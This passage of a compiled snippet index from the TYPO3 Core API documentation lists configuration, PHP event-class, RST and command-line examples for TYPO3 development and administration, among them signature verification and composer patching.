https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/CSRFlikeRequestTokenHandling.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _CSRFlikeRequestTokenHandling/_MyController.php\n        :caption: EXT:my_extension/Classes/Controller/MyController.php\n```\n\n----------------------------------------\n\nTITLE: Creating a Minimal robots.txt File in PHP\nDESCRIPTION: This snippet shows an example of a minimal robots.txt file content. It allows all user agents and intentionally leaves the file mostly blank.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n# This space intentionally left blank. Only add entries when you know how powerful the robots.txt is.\nUser-agent: *\n```\n\n----------------------------------------\n\nTITLE: Displaying Record Deletion in TYPO3 Workspace\nDESCRIPTION: CSV table showing the database representation of a record being deleted in a TYPO3 workspace. It demonstrates how a delete placeholder is created with t3ver_state = 2.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n12,20,0,256,0,0,0,0,0,Article #2\n...,...,...,...,...,...,...,...,...,...,...\n22,-1,0,256,1,12,2,0,0,Article #2 deleted\n```\n\n----------------------------------------\n\nTITLE: Setting Email Validators - TYPO3 PHP\nDESCRIPTION: This snippet defines the validators to be used for email validation within TYPO3. A list of available validators is provided.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['validators'] = [\n    \\Egulias\\EmailValidator\\Validation\\RFCValidation::class,\n];\n```\n\n----------------------------------------\n\nTITLE: Using AfterStdWrapFunctionsInitializedEvent Reference\nDESCRIPTION: Reference to the fully qualified class name of the AfterStdWrapFunctionsInitializedEvent in TYPO3's Frontend ContentObject system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterStdWrapFunctionsInitializedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\ContentObject\\Event\\AfterStdWrapFunctionsInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Updating NGINX Configuration for TYPO3 Backend Entry Point\nDESCRIPTION: This code snippet demonstrates the necessary changes in the NGINX configuration to update the TYPO3 backend entry point. It modifies the try_files directive to use the main index.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/BackendEntryPoint/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: nginx\nCODE:\n```\nlocation /typo3/ {\n    absolute_redirect off;\n    try_files $uri /index.php$is_args$args;\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 QueryBuilder Class in PHP\nDESCRIPTION: The fully qualified class name for the QueryBuilder class that helps create complex database queries with methods for CRUD operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder\n```\n\n----------------------------------------\n\nTITLE: Configuring Sitemap Template in reStructuredText\nDESCRIPTION: Sets the template for rendering the sitemap and includes common definitions. The sitemap.html template will automatically insert the page tree at this location.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Sitemap.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n:template: sitemap.html\n\n.. include:: /Includes.rst.txt\n\n=======\nSitemap\n=======\n\n.. The sitemap.html template will insert here the page tree automatically.\n```\n\n----------------------------------------\n\nTITLE: Defining SystemInformationToolbarCollectorEvent Class in PHP\nDESCRIPTION: This snippet defines the SystemInformationToolbarCollectorEvent class in the TYPO3\\CMS\\Backend\\Backend\\Event namespace. The class is used to enrich the system information toolbar in the TYPO3 Backend top toolbar with various information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/SystemInformationToolbarCollectorEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Backend\\Event\n\n..  php:class:: SystemInformationToolbarCollectorEvent\n\n    An event to enrich the system information toolbar in the TYPO3 Backend top toolbar\n    with various information\n\n    ..  php:method:: getToolbarItem()\n        :returns: `\\TYPO3\\CMS\\Backend\\Backend\\ToolbarItems\\SystemInformationToolbarItem`\n```\n\n----------------------------------------\n\nTITLE: Kickstarting a TYPO3 Extension with DDEV\nDESCRIPTION: Command to start the extension creation wizard using DDEV in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nddev exec vendor/bin/typo3 make:extension\n```\n\n----------------------------------------\n\nTITLE: Manually Dumping Autoload Information in TYPO3\nDESCRIPTION: Command to manually dump class loading information in TYPO3 when running in non-Composer mode. This can be used for troubleshooting when classes cannot be found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Autoloading/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nphp typo3/sysext/core/bin/typo3 dumpautoload\n```\n\n----------------------------------------\n\nTITLE: Displaying Values from $GLOBALS in TYPO3\nDESCRIPTION: This YAML snippet shows how to display a custom configuration from the `$GLOBALS` array using the `GlobalVariableProvider`. The `globalVariableKey` attribute specifies the key to be exposed.  The `label` attribute specifies a label for the configuration item.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationModule/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nmyextension.configuration.module.provider.myconfiguration:\n    class: 'TYPO3\\CMS\\Lowlevel\\ConfigurationModuleProvider\\GlobalVariableProvider'\n    tags:\n        - name: 'lowlevel.configuration.module.provider'\n          identifier: 'myConfiguration'\n          label: 'My global var'\n          globalVariableKey: 'MY_GLOBAL_VAR'\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Include and Index Directives\nDESCRIPTION: RST directives for including common definitions and creating an index entry for workspace events\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; workspaces\n..  _eventlist-workspaces:\n```\n\n----------------------------------------\n\nTITLE: Retrieving Current Link Parts in TYPO3 CMS\nDESCRIPTION: This method returns an array of the current link parts. It's part of the ModifyLinkHandlersEvent class in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkHandlersEvent.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getCurrentLinkParts()\n    :returns: `array<string,mixed>`\n```\n\n----------------------------------------\n\nTITLE: Preventing Access to Non-Public Files in TYPO3 Extensions\nDESCRIPTION: This section describes how to restrict access to files outside the Resources/Public directory of TYPO3 extensions through proper web server configuration to ensure security. It highlights the use of the 'helhum/typo3-secure-web' Composer package to store non-public files outside the web root.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Public/Index.rst#2025-04-16_snippet_0\n\n\n\n----------------------------------------\n\nTITLE: Verbose Composer Install for Debugging\nDESCRIPTION: Command to run composer install with very verbose output to help debug patch application failures by providing more detailed error messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncomposer install -vvv\n```\n\n----------------------------------------\n\nTITLE: Loading Files in PHP for TYPO3 Functional Test\nDESCRIPTION: Shows how to load files into the test instance for functional testing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\nprotected array $pathsToLinkInTestInstance = [\n    'typo3/sysext/core/Tests/Functional/Fixtures/Files/fileadmin/user_upload' => 'fileadmin/user_upload',\n];\n```\n\n----------------------------------------\n\nTITLE: Deprecated Replacement with typo3-ter in composer.json\nDESCRIPTION: This snippet shows a previous method of replacing the 'typo3-ter/*' entry within 'replace' in composer.json. This method is now outdated due to the deprecation of the TER Composer Repository and is not recommended for use with current Composer standards.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ComposerJson.rst#2025-04-16_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"replace\": {\n        \"typo3-ter/my_extension\": \"self.version\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PGP Signature Verification\nDESCRIPTION: Commands for verifying PGP signatures of TYPO3 release packages and importing release team public keys.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ReleaseIntegrity.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngpg --verify typo3_src-12.4.11.tar.gz.sig typo3_src-12.4.11.tar.gz\n```\n\nLANGUAGE: bash\nCODE:\n```\nwget -qO- https://get.typo3.org/KEYS | gpg --import\n```\n\nLANGUAGE: bash\nCODE:\n```\ngpg --fingerprint 0C4E49362CFACA0BBFCE5D16A36E4D1F16490937\n```\n\n----------------------------------------\n\nTITLE: Implementing removeAction Method in PHP\nDESCRIPTION: This method removes an action by its name. If the action exists in both groups and no group is specified, it removes the action from both groups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\npublic function removeAction(string $actionName, string $group = ''): bool\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Symlinks on Windows\nDESCRIPTION: Windows commands to create the required symbolic links in the public directory pointing to TYPO3 source files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/LegacyInstallation.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncd public\nmklink /d typo3_src ..\\typo3_src-13.4.y\nmklink /d typo3 typo3_src\\typo3\nmklink index.php typo3_src\\index.php\n```\n\n----------------------------------------\n\nTITLE: Enabling Deprecation Logging in TYPO3 Additional Configuration\nDESCRIPTION: This code demonstrates how to enable deprecation logging in TYPO3's additional.php configuration file, with a check to only enable it in the development context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Deprecation/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nif (\\TYPO3\\CMS\\Core\\Core\\Environment::getContext()->isDevelopment()) {\n    $GLOBALS['TYPO3_CONF_VARS']['LOG']['TYPO3']['CMS']['deprecations']['writerConfiguration'] = [\n        'notice' => [\n            'TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter' => [\n                'disabled' => false\n            ]\n        ]\n    ];\n}\n```\n\n----------------------------------------\n\nTITLE: Using Language Service with LANG in TYPO3\nDESCRIPTION: The LANG variable assists in fetching translations via the LanguageService, initialized by the `LanguageServiceFactory`. Direct use is discouraged, promoting the factory method for LanguageService retrieval.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_9\n\n\n\n----------------------------------------\n\nTITLE: Including RST Documentation Header\nDESCRIPTION: RST directive to include common documentation header file and set up navigation title for page-based routing documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/PageBasedRouting.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:navigation-title: Page-based Routing\n\n.. include:: /Includes.rst.txt\n\n.. index:: Routing; Page-based\n.. _routing-page-based-routing:\n```\n\n----------------------------------------\n\nTITLE: Configuring PHPStan for TYPO3 Projects\nDESCRIPTION: NEON configuration file for PHPStan, specifying analysis level, paths to scan, and baseline file for TYPO3 projects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n..  literalinclude:: _ProjectTesting/_phpstan.neon\n    :caption: Build/phpstan/phpstan.neon\n    :language: plaintext\n```\n\n----------------------------------------\n\nTITLE: RST Include and Index Directives for TYPO3 Services Documentation\nDESCRIPTION: RST directives to include common definitions and create index entries for the Services API configuration documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index:: Services API; Configuration\n.. _services-configuration:\n```\n\n----------------------------------------\n\nTITLE: YAML Configuration Example Patterns\nDESCRIPTION: Demonstrates various YAML string formatting techniques including trivial values, single-quoted, double-quoted, and multi-line strings used in TYPO3 configurations\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglYaml.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntrivial: aValue\nsimple: 'This is a \"salt\" used for various kinds of encryption ...'\ncomplex: \"This string has unicode escaped characters, like \\x0d\\x0a\"\nmulti: |\n   This is a multi-line string.\n\n   Line breaks are preserved in this value. It's good for including\n\n   <em>HTML snippets</em>.\n```\n\n----------------------------------------\n\nTITLE: Referencing Service Class Paths in TYPO3\nDESCRIPTION: Class path references for TYPO3 service-related utility classes used for service management and instantiation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/ServiceRelatedApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility\n```\n\n----------------------------------------\n\nTITLE: Creating ReStructuredText Reference Label for Processed Files Architecture\nDESCRIPTION: This directive creates a reference label 'fal-architecture-folders-processed-files' that can be used to link to this section from other parts of the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_4\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  _fal-architecture-folders-processed-files:\n```\n\n----------------------------------------\n\nTITLE: Service Instance Generation Method Reference\nDESCRIPTION: Reference to the makeInstanceService method call in TYPO3's GeneralUtility class for service instantiation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/ServiceRelatedApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstanceService()\n```\n\n----------------------------------------\n\nTITLE: Including and Scaling an Image in reStructuredText\nDESCRIPTION: This snippet demonstrates how to include an image and scale it to 80% within a reStructuredText document. The ``image`` directive is used to specify the image path, and the ``:scale:`` option sets the scaling factor.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/ExternalImages/Upgrade/GithubComposerName.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. image:: /Images/ExternalImages/Upgrade/GithubComposerName.png\n   :scale: 80 %\n```\n\n----------------------------------------\n\nTITLE: Declaring Empty Arrays in PHP\nDESCRIPTION: Using short array syntax for array declarations in PHP, with recommended formatting for array creation\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_20\n\nLANGUAGE: php\nCODE:\n```\n$a = [];\n```\n\n----------------------------------------\n\nTITLE: Working with Country Objects in TYPO3 Country API\nDESCRIPTION: Shows how to work with Country objects, including retrieving information and translating country names in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Country/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Context\\Context;\nuse TYPO3\\CMS\\Core\\Country\\CountryProvider;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nclass MyClassWithTranslation\n{\n    protected CountryProvider $countryProvider;\n\n    public function __construct(CountryProvider $countryProvider)\n    {\n        $this->countryProvider = $countryProvider;\n    }\n\n    public function myMethod(): void\n    {\n        $france = $this->countryProvider->getByIsoCode('FR');\n\n        // Get information about the country\n        $officialName = $france->getOfficialName();\n        $alpha2Code = $france->getIsoCode();\n        $alpha3Code = $france->getAlpha3IsoCode();\n        $numericCode = $france->getNumericIsoCode();\n        $flagAsEmoji = $france->getFlagEmoji();\n\n        // Language to use for translation\n        $language = GeneralUtility::makeInstance(Context::class)->getAspect('language')->getId();\n\n        // Get translated information\n        $localizedName = $france->getLocalName($language);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Test HTML for Parsing in TYPO3\nDESCRIPTION: This snippet defines a sample HTML content string to be used for demonstrating HTML parsing functionality in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ParsingHtml/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$testHTML = '\n      <DIV>\n         <IMG src=\"welcome.gif\">\n         <p>Line 1</p>\n         <p>Line <B class=\"test\">2</B></p>\n         <p>Line <b><i>3</i></p>\n         <img src=\"test.gif\" />\n         <BR><br/>\n         <TABLE>\n            <tr>\n               <td>Another line here</td>\n            </tr>\n         </TABLE>\n      </div>\n      <B>Text outside div tag</B>\n      <table>\n         <tr>\n            <td>Another line here</td>\n         </tr>\n      </table>\n   ';\n```\n\n----------------------------------------\n\nTITLE: Configuring RTE Buttons with TypoScript in TYPO3\nDESCRIPTION: This TypoScript snippet demonstrates how to control the visibility of buttons within the Rich Text Editor (RTE) in TYPO3 CMS.  It uses `showButtons` to explicitly list visible buttons and `hideButtons` to hide specific buttons, enhancing security by limiting potentially harmful functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/ContentElements.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nRTE.default {\n  showButtons = ...\n  hideButtons = ...\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Custom Link Handler Implementation\nDESCRIPTION: JavaScript code for handling link creation in the custom link browser tab.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nclass CustomLinkHandler {\n    constructor() {\n        this.linkBrowser = window.TYPO3.LinkBrowser;\n    }\n\n    /**\n     * @param {string} value\n     */\n    setLink(value) {\n        const issueId = document.querySelector('[name=\"issue\"]').value;\n        const baseUrl = 'github';\n\n        this.linkBrowser.finalizeFunction('t3://' + baseUrl + '?issue=' + issueId);\n    }\n}\n\nexport default new CustomLinkHandler();\n```\n\n----------------------------------------\n\nTITLE: Displaying Context Menu Screenshot in RST Documentation\nDESCRIPTION: RST directive for displaying a screenshot of a TYPO3 backend context menu that shows an additional custom menu item. The image includes proper alt text and styling for documentation purposes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/ContextualMenuExtended/ContextMenuTtContent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/ContextualMenuExtended/ContextMenuTtContent.png\n   :alt: The context menu now contains an additional item \"Hello World\"\n   :class: with-shadow\n\n   The context menu shown after clicking on the Content Element icon\n```\n\n----------------------------------------\n\nTITLE: Implementing getActions Method in PHP\nDESCRIPTION: This method retrieves all actions for the RecordList.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getActions(): array\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing setActions Method in PHP\nDESCRIPTION: This method sets the actions for the RecordList.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\npublic function setActions(array $actions)\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Author Settings in TYPO3 CMS YAML\nDESCRIPTION: This snippet shows how to define author settings in TYPO3 CMS using a YAML configuration file. It's typically placed in the site package's settings.definitions.yaml file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n..  literalinclude:: _snippets/_settings.definitions.yaml\n    :caption: packages/my_site_package/Configuration/Sets/SitePackage/settings.definitions.yaml\n```\n\n----------------------------------------\n\nTITLE: Defining Workspace Event Class Methods in TYPO3\nDESCRIPTION: PHP class definition for AfterDataGeneratedForWorkspaceEvent with methods to handle workspace version data. Includes getters and setters for grid service, data, and versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Workspaces/AfterDataGeneratedForWorkspaceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Workspaces\\Event;\n\nclass AfterDataGeneratedForWorkspaceEvent\n{\n    public function getGridService(): \\TYPO3\\CMS\\Workspaces\\Service\\GridDataService\n    {\n    }\n\n    public function getData(): array\n    {\n    }\n\n    public function setData(array $data)\n    {\n    }\n\n    public function getVersions(): array\n    {\n    }\n\n    public function setVersions(array $versions)\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Page Information in TYPO3\nDESCRIPTION: Demonstrates accessing page information using the frontend.page.information request attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/TSFE/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$pageInformation = $request->getAttribute('frontend.page.information');\n$pageId = $pageInformation->getId();\n```\n\n----------------------------------------\n\nTITLE: PHP Class Declaration for ModifyFileReferenceEnabledControlsEvent\nDESCRIPTION: Declaration of the ModifyFileReferenceEnabledControlsEvent class in the TYPO3\\CMS\\Backend\\Form\\Event namespace. This class provides methods to manage and modify file reference controls.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyFileReferenceEnabledControlsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Form\\Event\n\n..  php:class:: ModifyFileReferenceEnabledControlsEvent\n```\n\n----------------------------------------\n\nTITLE: Adjusted Core Patch Format\nDESCRIPTION: Example of a properly adjusted patch that has been modified for use with composer-patches. It contains only the extension-relative paths and has tests removed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\ndiff --git a/Classes/Utility/GeneralUtility.php b/Classes/Utility/GeneralUtility.php\nindex be47cfe..08fd6fc 100644\n--- a/Classes/Utility/GeneralUtility.php\n+++ b/Classes/Utility/GeneralUtility.php\n@@ -2282,17 +2282,24 @@\n      */\n     public static function createVersionNumberedFilename($file)\n     {\n+        $isFrontend = ($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n+            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend();\n         $lookupFile = explode('?', $file);\n         $path = $lookupFile[0];\n\n-        if (($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n-            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend()\n-        ) {\n+        if ($isFrontend) {\n             $mode = strtolower($GLOBALS['TYPO3_CONF_VARS']['FE']['versionNumberInFilename']);\n             if ($mode === 'embed') {\n                 $mode = true;\n```\n\n----------------------------------------\n\nTITLE: Manual Extension Configuration in PackageStates.php\nDESCRIPTION: Example of extension configuration in TYPO3's PackageStates.php file, showing the structure used to define an extension's package path. This configuration can be removed to manually uninstall an extension when the backend is inaccessible.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/LegacyExtensionInstallation.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'ext_key' => [\n      'packagePath' => 'typo3conf/ext/ext_key/',\n],\n//...\n```\n\n----------------------------------------\n\nTITLE: RST Index Directive\nDESCRIPTION: Defines index entries for languages and backend language documentation\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  index:: languages, backend language\n```\n\n----------------------------------------\n\nTITLE: Retrieving Field Name in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the name of the field associated with the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getFieldName()\n    :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Running t3ll Translation Tool on Linux/MacOS\nDESCRIPTION: Command to run the t3ll translation tool for local XLIFF file editing on Linux or MacOS systems.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nt3ll path/to/your/extension/Resources/Private/Language/locallang.xlf\n```\n\n----------------------------------------\n\nTITLE: Setting up .gitignore for TYPO3 Composer Projects\nDESCRIPTION: Sample .gitignore file configuration for TYPO3 projects managed with Composer. This excludes generated files and directories while ensuring necessary directories like /var/labels are versioned.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/VersionControl.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n/var/*\n!/var/labels\n/vendor/*\n/public/index.php\n/public/typo3/*\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Image Directive for TYPO3 Documentation\nDESCRIPTION: RST directive defining an image inclusion with specific styling for the TYPO3 documentation. Shows a screenshot of a modified new element wizard with added help section.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/Xclasses/XclassNewElementWizard.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/Xclasses/XclassNewElementWizard.png\n   :class: with-shadow\n\n   A help section is added at the bottom of the new record wizard\n```\n\n----------------------------------------\n\nTITLE: Advanced TypoScript IMAGE Configuration\nDESCRIPTION: Demonstrates advanced IMAGE object configuration using GIFBUILDER with current value.\nSOURCE: 